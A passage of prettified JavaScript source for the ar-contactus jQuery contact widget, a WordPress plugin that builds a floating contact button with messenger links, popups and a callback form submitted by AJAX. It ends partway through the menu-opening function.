// source --> https://www.raeedtv.com/wp-content/plugins/ar-contactus/res/js/jquery.contactus.min.js?ver=2.0.1 
var $jscomp = $jscomp || {};
$jscomp.scope = {};
$jscomp.findInternal = function(b, d, a) {
    b instanceof String && (b = String(b));
    for (var c = b.length, f = 0; f < c; f++) {
        var e = b[f];
        if (d.call(a, e, f, b))
            return {
                i: f,
                v: e
            }
    }
    return {
        i: -1,
        v: void 0
    }
}
;
$jscomp.ASSUME_ES5 = !1;
$jscomp.ASSUME_NO_NATIVE_MAP = !1;
$jscomp.ASSUME_NO_NATIVE_SET = !1;
$jscomp.SIMPLE_FROUND_POLYFILL = !1;
$jscomp.defineProperty = $jscomp.ASSUME_ES5 || "function" == typeof Object.defineProperties ? Object.defineProperty : function(b, d, a) {
    b != Array.prototype && b != Object.prototype && (b[d] = a.value)
}
;
$jscomp.getGlobal = function(b) {
    return "undefined" != typeof window && window === b ? b : "undefined" != typeof global && null != global ? global : b
}
;
$jscomp.global = $jscomp.getGlobal(this);
$jscomp.polyfill = function(b, d, a, c) {
    if (d) {
        a = $jscomp.global;
        b = b.split(".");
        for (c = 0; c < b.length - 1; c++) {
            var f = b[c];
            f in a || (a[f] = {});
            a = a[f]
        }
        b = b[b.length - 1];
        c = a[b];
        d = d(c);
        d != c && null != d && $jscomp.defineProperty(a, b, {
            configurable: !0,
            writable: !0,
            value: d
        })
    }
}
;
$jscomp.polyfill("Array.prototype.find", function(b) {
    return b ? b : function(b, a) {
        return $jscomp.findInternal(this, b, a).v
    }
}, "es6", "es3");
$jscomp.arrayIteratorImpl = function(b) {
    var d = 0;
    return function() {
        return d < b.length ? {
            done: !1,
            value: b[d++]
        } : {
            done: !0
        }
    }
}
;
$jscomp.arrayIterator = function(b) {
    return {
        next: $jscomp.arrayIteratorImpl(b)
    }
}
;
$jscomp.SYMBOL_PREFIX = "jscomp_symbol_";
$jscomp.initSymbol = function() {
    $jscomp.initSymbol = function() {}
    ;
    $jscomp.global.Symbol || ($jscomp.global.Symbol = $jscomp.Symbol)
}
;
$jscomp.Symbol = function() {
    var b = 0;
    return function(d) {
        return $jscomp.SYMBOL_PREFIX + (d || "") + b++
    }
}();
$jscomp.initSymbolIterator = function() {
    $jscomp.initSymbol();
    var b = $jscomp.global.Symbol.iterator;
    b || (b = $jscomp.global.Symbol.iterator = $jscomp.global.Symbol("iterator"));
    "function" != typeof Array.prototype[b] && $jscomp.defineProperty(Array.prototype, b, {
        configurable: !0,
        writable: !0,
        value: function() {
            return $jscomp.iteratorPrototype($jscomp.arrayIteratorImpl(this))
        }
    });
    $jscomp.initSymbolIterator = function() {}
}
;
$jscomp.initSymbolAsyncIterator = function() {
    $jscomp.initSymbol();
    var b = $jscomp.global.Symbol.asyncIterator;
    b || (b = $jscomp.global.Symbol.asyncIterator = $jscomp.global.Symbol("asyncIterator"));
    $jscomp.initSymbolAsyncIterator = function() {}
}
;
$jscomp.iteratorPrototype = function(b) {
    $jscomp.initSymbolIterator();
    b = {
        next: b
    };
    b[$jscomp.global.Symbol.iterator] = function() {
        return this
    }
    ;
    return b
}
;
$jscomp.iteratorFromArray = function(b, d) {
    $jscomp.initSymbolIterator();
    b instanceof String && (b += "");
    var a = 0
      , c = {
        next: function() {
            if (a < b.length) {
                var f = a++;
                return {
                    value: d(f, b[f]),
                    done: !1
                }
            }
            c.next = function() {
                return {
                    done: !0,
                    value: void 0
                }
            }
            ;
            return c.next()
        }
    };
    c[Symbol.iterator] = function() {
        return c
    }
    ;
    return c
}
;
$jscomp.polyfill("Array.prototype.values", function(b) {
    return b ? b : function() {
        return $jscomp.iteratorFromArray(this, function(b, a) {
            return a
        })
    }
}, "es8", "es3");
(function(b) {
    function d(a, c) {
        this._initialized = !1;
        this.settings = null;
        this.popups = [];
        this.options = b.extend({}, d.Defaults, c);
        this.$element = b(a);
        this.y = this.x = 0;
        this._interval;
        this._timeout;
        this._wellcomeMessagesDone = this._formOpened = this._callbackOpened = this._popupOpened = this._menuOpened = this._animation = !1;
        this.svgPath = this.countdown = null;
        this.svgSteps = [];
        this.svgInitialPath = this.svgPathOpen = null;
        this.isAnimating = !1;
        this.init()
    }
    d.Defaults = {
        online: null,
        activated: !1,
        pluginVersion: "2.3.1",
        wordpressPluginVersion: !1,
        align: "right",
        mode: "regular",
        countdown: 0,
        drag: !1,
        buttonText: "Contact us",
        buttonSize: "large",
        buttonIconSize: 24,
        menuSize: "normal",
        buttonIcon: '<svg width="20" height="20" viewBox="0 0 20 20" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g transform="translate(-825 -308)"><g><path transform="translate(825 308)" fill="#FFFFFF" d="M 19 4L 17 4L 17 13L 4 13L 4 15C 4 15.55 4.45 16 5 16L 16 16L 20 20L 20 5C 20 4.45 19.55 4 19 4ZM 15 10L 15 1C 15 0.45 14.55 0 14 0L 1 0C 0.45 0 0 0.45 0 1L 0 15L 4 11L 14 11C 14.55 11 15 10.55 15 10Z"/></g></g></svg>',
        ajaxUrl: "server.php",
        action: "callback",
        phonePlaceholder: "+X-XXX-XXX-XX-XX",
        callbackSubmitText: "Waiting for call",
        reCaptcha: !1,
        reCaptchaAction: "callbackRequest",
        reCaptchaKey: "",
        errorMessage: "Connection error. Please try again.",
        callProcessText: "We are calling you to phone",
        callSuccessText: "Thank you.<br>We are call you back soon.",
        showMenuHeader: !1,
        menuHeaderText: "How would you like to contact us?",
        menuSubheaderText: "",
        menuHeaderLayout: "icon-center",
        layout: "default",
        itemsHeader: "Start chat with:",
        menuHeaderIcon: null,
        menuHeaderTextAlign: "center",
        menuHeaderOnline: !0,
        showHeaderCloseBtn: !0,
        menuInAnimationClass: "show-messageners-block",
        menuOutAnimationClass: "",
        eaderCloseBtnBgColor: "#787878",
        eaderCloseBtnColor: "#FFFFFF",
        items: [],
        itemsIconType: "rounded",
        iconsAnimationSpeed: 800,
        iconsAnimationPause: 2E3,
        promptPosition: "side",
        style: null,
        itemsAnimation: null,
        popupAnimation: "scale",
        forms: {},
        theme: "#000000",
        subMenuHeaderBackground: "#FFFFFF",
        subMenuHeaderColor: "#FFFFFF",
        callbackFormText: "Please enter your phone number<br>and we call you back soon",
        closeIcon: '<svg width="12" height="13" viewBox="0 0 14 14" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g transform="translate(-4087 108)"><g><path transform="translate(4087 -108)" fill="currentColor" d="M 14 1.41L 12.59 0L 7 5.59L 1.41 0L 0 1.41L 5.59 7L 0 12.59L 1.41 14L 7 8.41L 12.59 14L 14 12.59L 8.41 7L 14 1.41Z"></path></g></g></svg>',
        callbackStateIcon: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M493.4 24.6l-104-24c-11.3-2.6-22.9 3.3-27.5 13.9l-48 112c-4.2 9.8-1.4 21.3 6.9 28l60.6 49.6c-36 76.7-98.9 140.5-177.2 177.2l-49.6-60.6c-6.8-8.3-18.2-11.1-28-6.9l-112 48C3.9 366.5-2 378.1.6 389.4l24 104C27.1 504.2 36.7 512 48 512c256.1 0 464-207.5 464-464 0-11.2-7.7-20.9-18.6-23.4z"></path></svg>'
    };
    d.prototype.init = function() {
        if (this._initialized)
            return !1;
        this.destroy();
        this.settings = b.extend({}, this.options);
        this.settings.forms.dynamic_form = {
            header: ""
        };
        this.$element.addClass("arcontactus-widget").addClass("arcontactus-message").addClass("layout-" + this.settings.layout);
        "elastic" == this.settings.style && this.$element.addClass("arcu-elastic");
        "bubble" == this.settings.style && this.$element.addClass("arcu-bubble");
        null != this.settings.style && "popup" != this.settings.style && "" != this.settings.style || !this.settings.popupAnimation || this.$element.addClass("arcu-" + this.settings.popupAnimation);
        "left" === this.settings.align ? this.$element.addClass("left") : this.$element.addClass("right");
        if (this.settings.items.length) {
            this.$element.append("\x3c!--noindex--\x3e");
            if ("regular" == this.settings.mode || "single" == this.settings.mode)
                if (this._initMessengersBlock(),
                "single" == this.settings.mode) {
                    var a = this.$element.find(".messangers-list li:first-child a");
                    a.attr("href") && this.$element.append(b("<a>", {
                        href: a.attr("href"),
                        target: a.attr("target"),
                        class: "arcu-single-mode-link"
                    }))
                }
            this.popups.length && this._initPopups();
            this._initMessageButton();
            this._initForms();
            this._initPrompt();
            this._initEvents();
            var c = this;
            setTimeout(function() {
                c.startAnimation()
            }, this.settings.iconsAnimationPause ? this.settings.iconsAnimationPause : 2E3);
            null !== this.settings.online && (a = b("<div>", {
                class: "arcu-online-badge " + (!0 === this.settings.online ? "online" : "offline")
            }),
            this.$element.append(a));
            this.$element.append("\x3c!--/noindex--\x3e");
            this.$element.addClass("active")
        } else
            console.info("jquery.contactus:no items");
        if ("elastic" == this.settings.style || "bubble" == this.settings.style)
            a = document.getElementById("arcu-morph-shape"),
            this.svgPath = Snap(a.querySelector("svg")).select("path"),
            this.svgPathOpen = a.getAttribute("data-morph-open"),
            this.svgInitialPath = this.svgPath.attr("d"),
            this.svgSteps = this.svgPathOpen.split(";"),
            this.svgStepsTotal = this.svgSteps.length;
        this._initialized = !0;
        this.$element.trigger("arcontactus.init")
    }
    ;
    d.prototype.destroy = function() {
        if (!this._initialized)
            return !1;
        this.stopAnimation(!1);
        this._removeEvents();
        this.$element.find(".arcontactus-message-button").unbind();
        this.$element.html("");
        this.$element.removeClass();
        this.$element.unbind().removeData("ar.contactus");
        this._initialized = !1;
        this.$element.trigger("arcontactus.destroy")
    }
    ;
    d.prototype._initForms = function() {
        var a = this
          , c = b("<div>", {
            class: "arcu-forms-container"
        })
          , f = b("<div>", {
            class: "arcu-close",
            style: "background-color:" + this.settings.theme + "; color: #FFFFFF"
        });
        f.append(this.settings.closeIcon);
        c.append(f);
        b.each(a.settings.forms, function(e) {
            if (this.icon) {
                var f = b("<div>", {
                    id: "form-icon-" + e,
                    class: "form-icon"
                });
                f.append(this.icon);
                a.$element.find(".arcontactus-message-button").append(f)
            }
            f = b("<div>", {
                class: "arcu-form-container",
                id: "arcu-form-" + e
            });
            e = "undefined" !== typeof this.action ? b("<form>", {
                action: this.action,
                method: "POST",
                class: "arcu-form",
                "data-id": e
            }) : b("<div>", {
                class: "arcu-form"
            });
            if ("string" == typeof this.header) {
                var d = b("<div>", {
                    class: "arcu-form-header",
                    style: a._backgroundStyle()
                });
                d.html(this.header);
                e.append(d)
            } else if ("object" == typeof this.header) {
                d = b("<div>", {
                    class: "arcu-form-header " + this.header.layout,
                    style: a._backgroundStyle()
                });
                var g = b("<div>", {
                    class: "arcu-form-header-content"
                });
                g.html(this.header.content);
                var k = b("<div>", {
                    class: "arcu-form-header-icon"
                });
                k.html(this.header.icon);
                d.append(k);
                d.append(g);
                e.append(d)
            }
            a._initFormFields(this, e);
            a._initFormButtons(this, e);
            f.append(e);
            "string" == typeof this.success && (e = b("<div>", {
                class: "arcu-form-success"
            }),
            d = b("<div>"),
            d.html(this.success),
            e.append(d),
            f.append(e));
            "string" == typeof this.error && (e = b("<div>", {
                class: "arcu-form-error"
            }),
            d = b("<div>"),
            d.html(this.error),
            e.append(d),
            f.append(e));
            c.append(f)
        });
        this.$element.append(c)
    }
    ;
    d.prototype._initFormButtons = function(a, c) {
        var f = this;
        b.each(a.buttons, function(e) {
            e = a.buttons[e];
            var d = b("<div>", {
                class: "arcu-form-group arcu-form-button"
            })
              , h = "";
            "undefined" != typeof e.class && (h = e.class);
            if (-1 !== ["button", "submit"].indexOf(e.type))
                var g = b("<button>", {
                    id: "arcu-button-" + e.id,
                    class: "arcu-button " + h,
                    type: e.type,
                    style: f._backgroundStyle()
                });
            else
                "a" == e.type && (g = b("<a>", {
                    id: "arcu-button-" + e.id,
                    class: "arcu-button " + h,
                    href: e.href,
                    type: e.type,
                    style: f._backgroundStyle()
                }));
            g.text(e.label);
            d.append(g);
            c.append(d)
        })
    }
    ;
    d.prototype._initFormFields = function(a, c) {
        b.each(a.fields, function(f) {
            var e = a.fields[f];
            f = b("<div>", {
                class: "arcu-form-group arcu-form-group-type-" + e.type + " arcu-form-group-" + e.name + (e.required ? " arcu-form-group-required" : "")
            });
            var d = "<input>";
            switch (e.type) {
            case "textarea":
                d = "<textarea>";
                break;
            case "dropdown":
                d = "<select>"
            }
            if (e.label) {
                var h = b("<div>", {
                    class: "arcu-form-label"
                });
                h.html(e.label);
                f.append(h)
            }
            var g = b(d, {
                name: e.name,
                class: "arcu-form-field arcu-field-" + e.name,
                required: e.required,
                type: "dropdown" == e.type ? null : e.type,
                value: e.value ? e.value : ""
            });
            g.attr("placeholder", e.placeholder);
            "undefined" != typeof e.maxlength && g.attr("maxlength", e.maxlength);
            "dropdown" == e.type && b.each(e.values, function(a) {
                var c = e.values[a]
                  , f = e.values[a];
                "object" == typeof e.values[a] && (c = e.values[a].value,
                f = e.values[a].label);
                a = b("<option>", {
                    value: c
                });
                a.text(f);
                g.append(a)
            });
            f.append(g);
            f.append(b("<div>", {
                class: "arcu-form-field-errors"
            }));
            c.append(f)
        })
    }
    ;
    d.prototype._initPopups = function() {
        var a = this
          , c = b("<div>", {
            class: "popups-block arcuAnimated"
        })
          , f = b("<div>", {
            class: "popups-list-container"
        });
        b.each(this.popups, function() {
            var c = b("<div>", {
                class: "arcu-popup",
                id: "arcu-popup-" + this.id
            })
              , d = b("<div>", {
                class: "arcu-popup-header",
                style: a.settings.theme ? "background-color:" + a.settings.theme : null
            })
              , h = b("<div>", {
                class: "arcu-popup-close",
                style: a.settings.theme ? "background-color:" + a.settings.theme : null
            })
              , g = b("<div>", {
                class: "arcu-popup-back",
                style: a.settings.theme ? "background-color:" + a.settings.theme : null
            });
            h.append(a.settings.closeIcon);
            g.append('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><path fill="currentColor" d="M231.293 473.899l19.799-19.799c4.686-4.686 4.686-12.284 0-16.971L70.393 256 251.092 74.87c4.686-4.686 4.686-12.284 0-16.971L231.293 38.1c-4.686-4.686-12.284-4.686-16.971 0L4.908 247.515c-4.686 4.686-4.686 12.284 0 16.971L214.322 473.9c4.687 4.686 12.285 4.686 16.971-.001z" class=""></path></svg>');
            d.text(this.title);
            d.append(h);
            d.append(g);
            h = b("<div>", {
                class: "arcu-popup-content"
            });
            h.html(this.popupContent);
            c.append(d);
            c.append(h);
            f.append(c)
        });
        c.append(f);
        this.$element.append(c)
    }
    ;
    d.prototype._initMessengersBlock = function() {
        var a = b("<div>", {
            class: "messangers-block arcuAnimated"
        })
          , c = b("<div>", {
            class: "messangers-list-container"
        });
        if ("personal" == this.settings.layout) {
            var f = b("<div>", {
                class: "arcu-items-header"
            });
            f.html(this.settings.itemsHeader);
            var e = b("<div>", {
                class: "arcu-wellcome"
            });
            c.append(e);
            c.append(f)
        }
        f = b("<ul>", {
            class: "messangers-list"
        });
        this.settings.itemsAnimation && f.addClass("arcu-" + this.settings.itemsAnimation);
        "normal" !== this.settings.menuSize && "large" !== this.settings.menuSize || a.addClass("lg");
        "small" === this.settings.menuSize && a.addClass("sm");
        this._appendMessengerIcons(f, this.settings.items);
        if (this.settings.showMenuHeader) {
            e = b("<div>", {
                class: "arcu-menu-header arcu-" + this.settings.menuHeaderLayout,
                style: this.settings.theme ? "background-color:" + this.settings.theme : null
            });
            var d = b("<div>", {
                class: "arcu-menu-header-content arcu-text-" + this.settings.menuHeaderTextAlign
            });
            d.html(this.settings.menuHeaderText);
            if (this.settings.menuHeaderIcon) {
                var h = b("<div>", {
                    class: "arcu-header-icon"
                });
                this.settings.menuHeaderIcon.match(/^https?:\/\//) ? h.css("background-image", "url(" + this.settings.menuHeaderIcon + ")").addClass("arcu-bg-image") : h.append(this.settings.menuHeaderIcon);
                if (null !== this.settings.menuHeaderOnline) {
                    var g = b("<div>", {
                        class: "arcu-online-badge " + (this.settings.menuHeaderOnline ? "online" : "offline"),
                        style: "border-color: " + this.settings.theme
                    });
                    h.append(g)
                }
                e.append(h)
            }
            e.append(d);
            this.settings.menuSubheaderText && (d = b("<div>", {
                class: "arcu-menu-subheader arcu-text-" + this.settings.menuHeaderTextAlign
            }),
            d.html(this.settings.menuSubheaderText),
            e.append(d));
            this.settings.showHeaderCloseBtn && (d = b("<div>", {
                class: "arcu-header-close",
                style: "color:" + this.settings.headerCloseBtnColor + "; background:" + this.settings.headerCloseBtnBgColor
            }),
            d.append(this.settings.closeIcon),
            e.append(d));
            a.append(e);
            a.addClass("has-header")
        }
        "rounded" == this.settings.itemsIconType ? f.addClass("rounded-items") : f.addClass("not-rounded-items");
        c.append(f);
        a.append(c);
        "elastic" == this.settings.style ? (c = '<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none"><path d="M-1,0h101c0,0-97.833,153.603-97.833,396.167C2.167,627.579,100,800,100,800H-1V0z"/></svg>',
        f = b("<div>", {
            class: "arcu-morph-shape",
            id: "arcu-morph-shape",
            "data-morph-open": "M-1,0h101c0,0,0-1,0,395c0,404,0,405,0,405H-1V0z"
        }),
        f.append(c),
        a.append(f)) : "bubble" == this.settings.style && (c = '<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none"><path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"></path><defs></defs></svg>',
        f = b("<div>", {
            class: "arcu-morph-shape",
            id: "arcu-morph-shape",
            "data-morph-open": "M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z"
        }),
        f.append(c),
        a.append(f));
        this.$element.append(a)
    }
    ;
    d.prototype._appendMessengerIcons = function(a, c) {
        var f = this;
        b.each(c, function(c) {
            c = b("<li>", {});
            if ("_popup" == this.href) {
                f.popups.push(this);
                var e = b("<div>", {
                    class: "messanger arcu-popup-link " + (this.class ? this.class : ""),
                    title: this.title,
                    "data-id": this.id ? this.id : null
                })
            } else if (e = b("<a>", {
                class: "messanger " + (this.class ? this.class : "") + (this.addons ? " has-addon " : ""),
                id: this.id ? this.id : null,
                rel: "nofollow noopener",
                href: this.href,
                title: this.title,
                target: this.target ? this.target : "_blank"
            }),
            this.onClick) {
                var d = this;
                e.on("click", function(a) {
                    d.onClick(a)
                })
            }
            this.addons && b.each(this.addons, function(a) {
                a = b("<a>", {
                    href: this.href,
                    title: this.title ? this.title : null,
                    target: this.target ? this.target : "_blank",
                    class: this.class ? this.class : "arcu-addon",
                    style: (this.color ? "color:" + this.color : null) + "; background-color: transparent"
                });
                if (this.icon)
                    if (0 === this.icon.indexOf("<"))
                        a.append(this.icon);
                    else if (-1 === this.icon.indexOf("<")) {
                        var c = b("<img>", {
                            src: this.icon
                        });
                        a.append(c)
                    }
                if (this.onClick) {
                    var f = this;
                    a.on("click", function(a) {
                        return f.onClick(a)
                    })
                }
                e.append(a)
            });
            var g = "rounded" == f.settings.itemsIconType ? this.noContainer ? b("<span>", {
                style: this.color ? "color:" + this.color + "; fill: " + this.color : null,
                class: "no-container"
            }) : b("<span>", {
                style: this.color && !this.noContainer ? "background-color:" + this.color : null
            }) : this.noContainer ? b("<span>", {
                style: this.color ? "color:" + this.color + "; fill: " + this.color : null,
                class: "no-container"
            }) : b("<span>", {
                style: (this.color && !this.noContainer ? "color:" + this.color : null) + "; background-color: transparent"
            });
            if ("undefined" !== typeof this.online && null !== this.online) {
                var k = b("<div>", {
                    class: "arcu-online-badge " + (!0 === this.online ? "online" : "offline")
                });
                g.append(k)
            }
            g.append(this.icon);
            e.append(g);
            g = b("<div>", {
                class: "arcu-item-label"
            });
            k = b("<div>", {
                class: "arcu-item-title"
            });
            k.text(this.title);
            g.append(k);
            "undefined" != typeof this.subTitle && this.subTitle && (k = b("<div>", {
                class: "arcu-item-subtitle"
            }),
            k.text(this.subTitle),
            g.append(k));
            e.append(g);
            c.append(e);
            a.append(c);
            if (this.items) {
                e = this;
                var l = this.id;
                g = b("<div>", {
                    class: "arcu-submenu-header",
                    style: "background-color:" + f.settings.subMenuHeaderBackground + "; color: " + e.subMenuHeaderIconColor
                });
                k = b("<div>", {
                    class: "arcu-submenu-title arcu-text-" + this.subMenuHeaderTextAlign,
                    style: "color:" + f.settings.subMenuHeaderColor
                });
                this.subMenuHeader ? k.text(this.subMenuHeader) : k.text(this.title);
                var n = b("<div>", {
                    class: "arcu-submenu-back",
                    style: "color:" + f.settings.subMenuHeaderColor + "; fill: " + f.settings.subMenuHeaderColor
                });
                n.html('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 512"><path fill="currentColor" d="M231.293 473.899l19.799-19.799c4.686-4.686 4.686-12.284 0-16.971L70.393 256 251.092 74.87c4.686-4.686 4.686-12.284 0-16.971L231.293 38.1c-4.686-4.686-12.284-4.686-16.971 0L4.908 247.515c-4.686 4.686-4.686 12.284 0 16.971L214.322 473.9c4.687 4.686 12.285 4.686 16.971-.001z" class=""></path></svg>');
                n.attr("data-rel", l);
                n.on("click", function() {
                    f.hideSubmenu({
                        id: "#" + l
                    })
                });
                g.append(n);
                this.subMenuHeaderIcon && g.append(this.subMenuHeaderIcon);
                g.append(k);
                k = b("<div>", {
                    class: "arcu-submenu-container"
                });
                n = b("<ul>", {
                    class: "arcu-submenu"
                });
                k.append(g);
                k.append(n);
                f._appendMessengerIcons(n, this.items);
                c.append(k)
            }
        })
    }
    ;
    d.prototype._initMessageButton = function() {
        var a = this
          , c = b("<div>", {
            class: "arcontactus-message-button",
            style: this._backgroundStyle()
        });
        "large" === this.settings.buttonSize && this.$element.addClass("lg");
        "huge" === this.settings.buttonSize && this.$element.addClass("hg");
        "medium" === this.settings.buttonSize && this.$element.addClass("md");
        "small" === this.settings.buttonSize && this.$element.addClass("sm");
        var f = b("<div>", {
            class: "static"
        })
          , e = b("<div>", {
            class: "img-" + this.settings.buttonIconSize
        });
        e.append(this.settings.buttonIcon);
        !1 !== this.settings.buttonText ? e.append("<p>" + this.settings.buttonText + "</p>") : c.addClass("no-text");
        f.append(e);
        e = b("<div>", {
            class: "callback-state",
            style: a._colorStyle()
        });
        e.append(this.settings.callbackStateIcon);
        var d = b("<div>", {
            class: "icons hide"
        })
          , h = b("<div>", {
            class: "icons-line"
        });
        b.each(this.settings.items, function(c) {
            this.includeIconToSlider && (c = b("<span>", {
                style: a._colorStyle()
            }),
            c.append(this.icon),
            h.append(c))
        });
        d.append(h);
        var g = b("<div>", {
            class: "arcontactus-close"
        });
        g.append(this.settings.closeIcon);
        var k = b("<div>", {
            class: "pulsation",
            style: a._backgroundStyle()
        })
          , l = b("<div>", {
            class: "pulsation",
            style: a._backgroundStyle()
        });
        c.append(f).append(e).append(d).append(g).append(k).append(l);
        this.$element.append(c)
    }
    ;
    d.prototype._initPrompt = function() {
        var a = b("<div>", {
            class: "arcontactus-prompt arcu-prompt-" + this.settings.promptPosition
        })
          , c = b("<div>", {
            class: "arcontactus-prompt-close",
            style: this._backgroundStyle() + "; color: #FFFFFF"
        });
        c.append(this.settings.closeIcon);
        var f = b("<div>", {
            class: "arcontactus-prompt-inner"
        });
        a.append(c).append(f);
        this.$element.append(a)
    }
    ;
    d.prototype._initEvents = function() {
        var a = this.$element
          , c = this;
        a.find(".arcontactus-message-button").on("mousedown", function(a) {
            c.x = a.pageX;
            c.y = a.pageY
        }).on("mouseup", function(b) {
            if (c.settings.drag && b.pageX === c.x && b.pageY === c.y || !c.settings.drag) {
                if ("regular" == c.settings.mode)
                    c._menuOpened || c._popupOpened || c._callbackOpened || c._formOpened ? (c._menuOpened && c.closeMenu(),
                    c._popupOpened && c.closePopup()) : c.openMenu();
                else if ("single" == c.settings.mode) {
                    var e = a.find(".messangers-list li:first-child a");
                    e.attr("href") || e.click()
                } else
                    c.showForm("callback");
                b.preventDefault()
            }
        });
        this.settings.drag && (a.draggable(),
        a.get(0).addEventListener("touchmove", function(c) {
            var b = c.targetTouches[0];
            a.get(0).style.left = b.pageX - 25 + "px";
            a.get(0).style.top = b.pageY - 25 + "px";
            c.preventDefault()
        }, !1));
        b(document).on("click", function(a) {
            c.closeMenu();
            c.closePopup()
        });
        a.on("click", function(a) {
            a.stopPropagation()
        });
        a.find(".call-back").on("click", function() {
            c.openCallbackPopup()
        });
        a.find(".arcu-popup-link").on("click", function() {
            var a = b(this).data("id");
            c.openPopup(a)
        });
        a.find(".arcu-header-close").on("click", function() {
            c.closeMenu()
        });
        a.find(".arcu-popup-close").on("click", function() {
            c.closePopup()
        });
        a.find(".arcu-popup-back").on("click", function() {
            c.closePopup();
            c.openMenu()
        });
        a.find(".arcu-close").on("click", function() {
            null != c.countdown && (clearInterval(c.countdown),
            c.countdown = null);
            c.hideForm()
        });
        a.find(".arcontactus-prompt-close").on("click", function() {
            c.hidePrompt()
        });
        a.find("form").on("submit", function(f) {
            f.preventDefault();
            var e = b(this);
            e.parent().addClass("ar-loading");
            c.settings.reCaptcha ? grecaptcha.execute(c.settings.reCaptchaKey, {
                action: c.settings.reCaptchaAction
            }).then(function(b) {
                a.find(".ar-g-token").val(b);
                c.sendFormData(e)
            }) : c.sendFormData(e)
        });
        setTimeout(function() {
            c._processHash()
        }, 500);
        b(window).on("hashchange", function(a) {
            c._processHash()
        })
    }
    ;
    d.prototype._removeEvents = function() {
        b(document).unbind("click")
    }
    ;
    d.prototype._processHash = function() {
        switch (window.location.hash) {
        case "#callback-form":
        case "callback-form":
            this.showForm("callback");
            break;
        case "#callback-form-close":
        case "callback-form-close":
            this.hideForm();
            break;
        case "#contactus-menu":
        case "contactus-menu":
            this.openMenu();
            break;
        case "#contactus-menu-close":
        case "contactus-menu-close":
            this.closeMenu();
            break;
        case "#contactus-hide":
        case "contactus-hide":
            this.hide();
            break;
        case "#contactus-show":
        case "contactus-show":
            this.show()
        }
    }
    ;
    d.prototype._callBackCountDownMethod = function() {
        var a = this.settings.countdown
          , c = this.$element
          , b = this
          , e = 60;
        c.find(".callback-countdown-block-phone, .callback-countdown-block-timer").toggleClass("display-flex");
        this.countdown = setInterval(function() {
            --e;
            var d = a
              , f = e;
            10 > a && (d = "0" + a);
            10 > e && (f = "0" + e);
            d = d + ":" + f;
            c.find(".callback-countdown-block-timer_timer").html(d);
            0 === e && 0 === a && (clearInterval(b.countdown),
            b.countdown = null,
            c.find(".callback-countdown-block-sorry, .callback-countdown-block-timer").toggleClass("display-flex"));
            0 === e && (e = 60,
            --a)
        }, 20)
    }
    ;
    d.prototype._clearFormErrors = function(a) {
        a.find(".arcu-form-group.has-error").removeClass("has-error")
    }
    ;
    d.prototype._processFormErrors = function(a, c) {
        0 == c.success && b.each(c.errors, function(b) {
            a.find(".arcu-form-group-" + b).addClass("has-error");
            a.find(".arcu-form-group-" + b).find(".arcu-form-field-errors").html(c.errors[b].join("<br/>"))
        })
    }
    ;
    d.prototype.sendFormData = function(a) {
        var c = this
          , d = c.$element;
        d.trigger("arcontactus.beforeSendFormData", {
            form: a
        });
        b.ajax({
            url: a.attr("action"),
            type: a.attr("method"),
            dataType: "json",
            data: a.serialize(),
            success: function(b) {
                a.parent().removeClass("ar-loading");
                c._clearFormErrors(a);
                b.success ? (a.parent().find(".arcu-form-success").addClass("active"),
                a.parent().find(".arcu-form-error").removeClass("active"),
                d.trigger("arcontactus.successSendFormData", {
                    form: a,
                    data: b
                })) : (b.errors && c._processFormErrors(a, b),
                d.trigger("arcontactus.errorSendFormData", {
                    form: a,
                    data: b
                }))
            },
            error: function() {
                c._clearFormErrors(a);
                a.parent().find(".arcu-form-success").removeClass("active");
                a.parent().find(".arcu-form-error").addClass("active");
                a.parent().removeClass("ar-loading");
                alert(c.settings.errorMessage);
                d.trigger("arcontactus.errorSendFormData", {
                    form: a,
                    data: null
                })
            }
        })
    }
    ;
    d.prototype.show = function() {
        this.$element.addClass("active");
        this.$element.trigger("arcontactus.show")
    }
    ;
    d.prototype.hide = function() {
        this.$element.removeClass("active");
        this.$element.trigger("arcontactus.hide")
    }
    ;
    d.prototype.openPopup = function(a) {
        this.closeMenu();
        var b = this.$element;
        b.find("#arcu-popup-" + a).addClass("show-messageners-block");
        b.find("#arcu-popup-" + a).hasClass("popup-opened") || (this.stopAnimation(!1),
        b.addClass("popup-opened"),
        b.find("#arcu-popup-" + a).addClass(this.settings.menuInAnimationClass),
        b.find(".arcontactus-close").addClass("show-messageners-block"),
        b.find(".icons, .static").addClass("hide"),
        b.find(".pulsation").addClass("stop"),
        this._popupOpened = !0,
        this.$element.trigger("arcontactus.openPopup"))
    }
    ;
    d.prototype.closePopup = function() {
        var a = this.$element;
        a.find(".arcu-popup").hasClass("show-messageners-block") && (setTimeout(function() {
            a.removeClass("popup-opened")
        }, 150),
        a.find(".arcu-popup").removeClass(this.settings.menuInAnimationClass).addClass(this.settings.menuOutAnimationClass),
        setTimeout(function() {
            a.removeClass("popup-opened")
        }, 150),
        a.find(".arcontactus-close").removeClass("show-messageners-block"),
        a.find(".icons, .static").removeClass("hide"),
        a.find(".pulsation").removeClass("stop"),
        this.startAnimation(),
        this._popupOpened = !1,
        this.$element.trigger("arcontactus.closeMenu"))
    }
    ;
    d.prototype.openMenu = function() {
        if ("callback" == this.settings.mode)
            return console.log("Widget in callback mode"),
            !1;
        this._formOpened && this.hideForm();
        if ("elastic" == this.settings.style || "bubble" == this.settings.style)
            jQuery("body").addClass("arcu-show-menu").addClass("arcu-menu-" + this.settings.align),
            jQuery("body").addClass("arcu-pushed");
        var a = this.$element
          , b = this;
        a.find(".messangers-block").hasClass(this.settings.menuInAnimationClass) || (this.stopAnimation(!1),
        a.addClass("open"),
        a.find(".messangers-block").addClass(this.settings.menuInAnimationClass),
        a.find(".arcontactus-close").addClass("show-messageners-block"),
